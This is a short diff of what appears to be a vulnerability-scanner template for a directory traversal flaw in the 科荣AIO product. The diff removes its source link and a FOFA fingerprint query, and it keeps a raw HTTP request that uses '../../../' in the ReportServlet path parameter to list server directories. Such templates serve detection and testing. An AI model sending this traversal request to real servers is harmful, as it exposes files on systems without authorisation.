@@ -3,12 +3,8 @@ info:
   name: 科荣AIO 目录遍历漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ylpwxap03rgwztu4'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ylpwxap03rgwztu4
-    fofa: '"changeAccount(''8000'')"'
 http:
 - raw:
   - 'GET /ReportServlet?operation=getFileList&path=../../../ HTTP/1.1
